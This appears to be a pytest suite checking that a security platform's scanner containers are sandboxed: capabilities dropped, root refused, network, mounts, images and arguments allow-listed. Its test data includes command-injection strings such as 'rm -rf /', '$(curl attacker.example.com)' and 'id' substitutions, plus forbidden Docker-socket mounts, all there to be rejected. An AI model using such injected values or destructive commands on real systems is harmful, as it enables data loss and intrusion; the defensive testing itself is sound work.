"""SEC-004 / FR-014: scanner containers must be isolated.

The PRD is specific about what isolation means, and each clause gets an assertion:

======================================  ==========================================
PRD requirement                         Assertion here
======================================  ==========================================
"no direct database access"             ``test_network_is_not_host_or_bridge``
"no access to application secrets"      ``test_no_environment_is_passed``
"host filesystem -- unless required"    ``test_forbidden_host_paths_are_refused``
"restricted permissions"                ``test_capabilities_are_dropped``
"CPU limits, memory limits"             ``test_resource_limits_are_set``
"temporary filesystem"                  ``test_tmpfs_is_hardened``
"never run as unrestricted processes"   ``test_root_is_refused_however_spelled``
======================================  ==========================================

``build_sandbox`` calls ``assert_sandbox_safe`` on its own output, so the happy-path
tests below are checking that the invariants *are what we think they are* rather than
that they hold.  The tests that matter are the ones that hand ``assert_sandbox_safe`` a
weakened dict directly: that is the exact shape of a future regression, where somebody
edits ``build_sandbox`` to fix a scanner and quietly removes a restriction.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from app.core.config import ScannerSettings
from app.core.errors import UnsafeScannerInvocationError
from app.scanners.sandbox import (
    ALLOWED_ENV_NAMES,
    ALLOWED_WORK_MOUNTS,
    assert_sandbox_safe,
    build_sandbox,
    sandbox_evidence,
    validate_argv,
    validate_image,
)

NMAP_IMAGE = ScannerSettings(_env_file=None).image_nmap  # type: ignore[call-arg]


@pytest.fixture
def sandbox(scanner_settings: ScannerSettings, workdir: Path) -> dict:
    return build_sandbox(scanner_settings, workdir=workdir, image=NMAP_IMAGE)


# ---------------------------------------------------------------------------
# The isolation properties themselves
# ---------------------------------------------------------------------------


def test_no_environment_is_passed(sandbox: dict) -> None:
    """SEC-002 + SEC-004. The worker's environment holds every credential Cynux has."""
    assert sandbox["environment"] == {}


def test_network_is_not_host_or_bridge(sandbox: dict, scanner_settings: ScannerSettings) -> None:
    """SEC-004 "no direct database access", enforced by topology.

    ``host`` would put the scanner on the host's network stack, reaching Postgres,
    Redis and MinIO. ``bridge`` is the default network other Compose services may share.
    """
    assert sandbox["network"] == scanner_settings.network
    assert sandbox["network"] not in ("host", "bridge", "", None)


def test_capabilities_are_dropped(sandbox: dict) -> None:
    assert sandbox["cap_drop"] == ["ALL"]
    assert sandbox["cap_add"] == []
    assert sandbox["privileged"] is False
    assert "no-new-privileges:true" in sandbox["security_opt"]


def test_runs_as_an_unprivileged_user(sandbox: dict) -> None:
    uid = str(sandbox["user"]).split(":", 1)[0]
    assert uid not in ("0", "root")
    assert int(uid) > 0


def test_resource_limits_are_set(sandbox: dict, scanner_settings: ScannerSettings) -> None:
    assert sandbox["nano_cpus"] == int(scanner_settings.cpu_quota_cores * 1_000_000_000)
    assert sandbox["mem_limit"] == f"{scanner_settings.memory_limit_mb}m"
    #: Equal to mem_limit, not double it: a memory-hungry scan is killed rather than
    #: allowed to thrash the host's disk through swap.
    assert sandbox["memswap_limit"] == sandbox["mem_limit"]
    assert sandbox["pids_limit"] == scanner_settings.pids_limit


def test_root_filesystem_is_read_only_by_default(sandbox: dict) -> None:
    assert sandbox["read_only"] is True


def test_tmpfs_is_hardened(sandbox: dict) -> None:
    options = sandbox["tmpfs"]["/tmp"]
    for flag in ("noexec", "nosuid", "nodev"):
        assert flag in options, f"/tmp is missing {flag}"
    assert "size=" in options, "an unbounded tmpfs is a host memory exhaustion vector"


def test_only_the_job_directory_is_mounted(sandbox: dict, workdir: Path) -> None:
    volumes = sandbox["volumes"]
    assert len(volumes) == 1, "a scanner needs exactly one mount: its own job directory"
    (source,) = volumes
    assert Path(source).resolve() == workdir.resolve()
    assert volumes[source]["bind"] in ALLOWED_WORK_MOUNTS


def test_container_is_not_restarted_and_not_auto_removed(sandbox: dict) -> None:
    """A scanner that dies must stay dead, and must leave its exit code behind.

    ``restart_policy`` other than ``no`` would re-scan a target with no job record and
    no approval check. ``auto_remove`` would race the runner's log and exit-code read,
    which is the FR-014 evidence.
    """
    assert sandbox["restart_policy"] == {"Name": "no"}
    assert sandbox["auto_remove"] is False


def test_namespaces_are_not_shared(sandbox: dict) -> None:
    assert not sandbox.get("pid_mode")
    assert sandbox.get("ipc_mode") != "host"


# ---------------------------------------------------------------------------
# The bounded dials: each may be adjusted, none may be adjusted arbitrarily
# ---------------------------------------------------------------------------


def test_root_is_refused_however_spelled(scanner_settings: ScannerSettings, workdir: Path) -> None:
    """FR-014: "never run as unrestricted processes".

    Root in the container is root on the host's files, because the workdir is a bind
    mount. No adapter decision justifies it.
    """
    for user in ("0", "0:0", "root", "root:root", " 0 "):
        with pytest.raises(UnsafeScannerInvocationError):
            build_sandbox(scanner_settings, workdir=workdir, image=NMAP_IMAGE, run_as_user=user)


def test_an_empty_user_override_falls_back_to_the_unprivileged_default(
    scanner_settings: ScannerSettings, workdir: Path
) -> None:
    """``run_as_user=""`` means *no override*, not *root*.

    Worth pinning down rather than leaving implicit: the fallback is ``run_as_user or
    settings.run_as_user``, so an empty string resolves to ``nobody``. If that ``or`` ever
    became a ``if is None`` the empty value would reach Docker, and Docker reads an empty
    user as the image default -- which for most scanner images is root.
    """
    built = build_sandbox(scanner_settings, workdir=workdir, image=NMAP_IMAGE, run_as_user="")
    assert built["user"] == scanner_settings.run_as_user
    assert str(built["user"]).split(":", 1)[0] not in ("0", "root", "")


def test_an_empty_user_in_a_built_dict_is_still_a_violation(sandbox: dict) -> None:
    """The other half: whatever produced it, ``user: ""`` must not survive the gate."""
    for user in ("", None, " "):
        with pytest.raises(UnsafeScannerInvocationError):
            assert_sandbox_safe({**sandbox, "user": user})


def test_a_different_unprivileged_uid_is_allowed(
    scanner_settings: ScannerSettings, workdir: Path
) -> None:
    """ZAP needs uid 1000: its image pre-creates a home directory owned by it."""
    built = build_sandbox(
        scanner_settings, workdir=workdir, image=NMAP_IMAGE, run_as_user="1000:1000"
    )
    assert built["user"] == "1000:1000"


def test_work_mount_is_allow_listed(scanner_settings: ScannerSettings, workdir: Path) -> None:
    """A mount at ``/`` or ``/usr/bin`` is a container escape dressed as a config value."""
    for mount in ("/", "/usr/bin", "/etc", "/work/../etc", "/anything"):
        with pytest.raises(UnsafeScannerInvocationError):
            build_sandbox(scanner_settings, workdir=workdir, image=NMAP_IMAGE, work_mount=mount)
    for mount in sorted(ALLOWED_WORK_MOUNTS):
        built = build_sandbox(scanner_settings, workdir=workdir, image=NMAP_IMAGE, work_mount=mount)
        assert built["working_dir"] == mount


def test_environment_names_are_allow_listed(
    scanner_settings: ScannerSettings, workdir: Path
) -> None:
    """SEC-002 as an allow-list.

    A reject-if-it-looks-secret check passed ``SMTP_PASS``. Six permitted names, each
    charset-checked, is the stricter statement of the same intent.
    """
    for name in ("SMTP_PASS", "CYNUX_SECURITY__JWT_SECRET", "AWS_ACCESS_KEY_ID", "PATH"):
        with pytest.raises(UnsafeScannerInvocationError):
            build_sandbox(
                scanner_settings,
                workdir=workdir,
                image=NMAP_IMAGE,
                environment={name: "value"},
            )

    built = build_sandbox(
        scanner_settings, workdir=workdir, image=NMAP_IMAGE, environment={"HOME": "/tmp"}
    )
    assert built["environment"] == {"HOME": "/tmp"}
    assert set(built["environment"]) <= ALLOWED_ENV_NAMES


def test_environment_values_are_charset_checked(
    scanner_settings: ScannerSettings, workdir: Path
) -> None:
    for value in ("/tmp; rm -rf /", "$(id)", "/tmp\nHOME=/root", ""):
        with pytest.raises(UnsafeScannerInvocationError):
            build_sandbox(
                scanner_settings,
                workdir=workdir,
                image=NMAP_IMAGE,
                environment={"HOME": value},
            )


def test_forbidden_host_paths_are_refused(scanner_settings: ScannerSettings) -> None:
    """The Docker socket is the mount that makes the whole sandbox decorative.

    A container holding it can start a privileged one. ``/etc``, ``/root``, ``/proc``,
    ``/sys`` and ``/dev`` are refused for the same reason at lower stakes.
    """
    for source in ("/var/run/docker.sock", "/run/docker.sock", "/etc", "/root", "/proc"):
        weakened = {
            "network": "cynux_scanner_net",
            "user": "65534:65534",
            "cap_drop": ["ALL"],
            "cap_add": [],
            "privileged": False,
            "security_opt": ["no-new-privileges:true"],
            "pids_limit": 512,
            "mem_limit": "2048m",
            "nano_cpus": 1_000_000_000,
            "environment": {},
            "volumes": {source: {"bind": "/work", "mode": "rw"}},
        }
        with pytest.raises(UnsafeScannerInvocationError) as excinfo:
            assert_sandbox_safe(weakened)
        assert "volume" in str(excinfo.value.context.get("problems", []))


def test_a_missing_workdir_is_refused(scanner_settings: ScannerSettings, tmp_path: Path) -> None:
    """A nonexistent source makes Docker create a root-owned directory on the host."""
    with pytest.raises(UnsafeScannerInvocationError):
        build_sandbox(scanner_settings, workdir=tmp_path / "nope", image=NMAP_IMAGE)


# ---------------------------------------------------------------------------
# assert_sandbox_safe as a regression gate on build_sandbox itself
# ---------------------------------------------------------------------------

#: Each entry is one restriction removed from an otherwise-safe dict. Every one of these
#: is a plausible one-line edit somebody makes to get a stubborn scanner to start.
WEAKENINGS: list[tuple[str, dict]] = [
    ("privileged", {"privileged": True}),
    ("cap_add", {"cap_add": ["NET_RAW"]}),
    ("cap_drop", {"cap_drop": []}),
    ("cap_drop_partial", {"cap_drop": ["NET_ADMIN"]}),
    ("no_new_privileges", {"security_opt": []}),
    ("pids_limit", {"pids_limit": 0}),
    ("mem_limit", {"mem_limit": ""}),
    ("nano_cpus", {"nano_cpus": 0}),
    ("network_host", {"network": "host"}),
    ("network_bridge", {"network": "bridge"}),
    ("network_empty", {"network": ""}),
    ("root_user", {"user": "0:0"}),
    ("root_name", {"user": "root"}),
    ("pid_host", {"pid_mode": "host"}),
    ("ipc_host", {"ipc_mode": "host"}),
    ("secret_env", {"environment": {"CYNUX_DB__PASSWORD": "x"}}),
    ("aws_env", {"environment": {"AWS_SECRET_ACCESS_KEY": "x"}}),
    ("bad_bind", {"volumes": {"/tmp/job": {"bind": "/usr/bin", "mode": "rw"}}}),
]


@pytest.mark.parametrize(("label", "override"), WEAKENINGS, ids=[w[0] for w in WEAKENINGS])
def test_assert_sandbox_safe_catches_each_weakening(
    sandbox: dict, label: str, override: dict
) -> None:
    weakened = {**sandbox, **override}
    with pytest.raises(UnsafeScannerInvocationError):
        assert_sandbox_safe(weakened)


def test_the_unweakened_sandbox_passes_its_own_check(sandbox: dict) -> None:
    """Guards the parametrized test above from passing for the wrong reason."""
    assert_sandbox_safe(sandbox)


# ---------------------------------------------------------------------------
# Image and argv allow-lists
# ---------------------------------------------------------------------------


def test_only_allow_listed_images_may_run(scanner_settings: ScannerSettings) -> None:
    """The agent picks a scanner, never an image reference.

    This is what makes that structural: a model-supplied string cannot reach the Docker
    API even if it reaches an image field.
    """
    for image in scanner_settings.allowed_images:
        assert validate_image(image, scanner_settings) == image
    for image in ("alpine:latest", "attacker/backdoor:1", "", "instrumentisto/nmap:latest"):
        with pytest.raises(UnsafeScannerInvocationError):
            validate_image(image, scanner_settings)


#: Injection shapes. No shell is involved -- ``container.create`` takes a list -- but the
#: allow-list is enforced anyway, because defence that depends on one downstream call
#: staying correct breaks the first time somebody adds a convenience wrapper.
UNSAFE_ARGV: list[tuple[str, ...]] = [
    ("nmap", "example.com; rm -rf /"),
    ("nmap", "$(curl attacker.example.com)"),
    ("nmap", "${HOME}"),
    ("nmap", "`id`"),
    ("nmap", "../../etc/passwd"),
    ("nmap", "example.com\nnmap internal.local"),
    ("nmap", "example.com\r\n"),
    ("nmap", "example.com\x00"),
    ("nmap", "a b"),
    ("nmap", "target|tee /work/x"),
    ("nmap", ">redirect"),
    ("nmap", "'quoted'"),
    ("nmap", '"quoted"'),
]


@pytest.mark.parametrize("argv", UNSAFE_ARGV, ids=[a[1][:24] for a in UNSAFE_ARGV])
def test_unsafe_argv_is_refused(argv: tuple[str, ...]) -> None:
    with pytest.raises(UnsafeScannerInvocationError):
        validate_argv(argv, scanner="nmap")


SAFE_ARGV: list[tuple[str, ...]] = [
    ("-sT", "-Pn", "--top-ports", "1000", "-oX", "/work/out/nmap.xml", "example.com"),
    ("-l", "/work/targets.txt", "-severity", "critical,high,medium"),
    ("-u", "https://app.example.com/login?next=%2Fdashboard"),
    ("-t", "192.168.0.0/24"),
    ("-t", "2001:db8::[1]"),
    ("--json-export", "/work/out/nuclei.jsonl"),
    ("-d", "sub.example.co.uk"),
    ("-u", "user@example.com"),
]


@pytest.mark.parametrize("argv", SAFE_ARGV, ids=[a[0] + "-" + a[1][:20] for a in SAFE_ARGV])
def test_legitimate_argv_is_allowed(argv: tuple[str, ...]) -> None:
    """Over-strict argv validation breaks real scans, which is its own failure mode."""
    assert validate_argv(argv, scanner="nmap") == argv


def test_empty_and_oversized_argv_are_refused() -> None:
    with pytest.raises(UnsafeScannerInvocationError):
        validate_argv((), scanner="nmap")
    with pytest.raises(UnsafeScannerInvocationError):
        validate_argv(("nmap", ""), scanner="nmap")
    with pytest.raises(UnsafeScannerInvocationError):
        validate_argv(("nmap", "a" * 2049), scanner="nmap")


def test_non_string_argv_element_is_refused() -> None:
    with pytest.raises(UnsafeScannerInvocationError):
        validate_argv(("nmap", 443), scanner="nmap")  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# Evidence
# ---------------------------------------------------------------------------


def test_evidence_records_the_limits_and_no_secrets(sandbox: dict) -> None:
    """FR-014 evidence: an auditor reads a database row, not a rotated log line."""
    evidence = sandbox_evidence(sandbox)
    for key in ("image", "network", "user", "mem_limit", "pids_limit", "cap_drop", "privileged"):
        assert key in evidence, f"evidence omits {key}"
    assert evidence["cap_drop"] == ["ALL"]
    assert evidence["privileged"] is False
    #: Names only, never values -- the evidence answers "was anything injected?" rather
    #: than reproducing the configuration.
    assert evidence["environment_names"] == []
    assert evidence["environment_passed"] == 0
    assert "environment" not in evidence


def test_evidence_reports_env_names_without_values(
    scanner_settings: ScannerSettings, workdir: Path
) -> None:
    built = build_sandbox(
        scanner_settings, workdir=workdir, image=NMAP_IMAGE, environment={"HOME": "/tmp"}
    )
    evidence = sandbox_evidence(built)
    assert evidence["environment_names"] == ["HOME"]
    assert evidence["environment_passed"] == 1
    assert "/tmp" not in str(evidence["environment_names"])
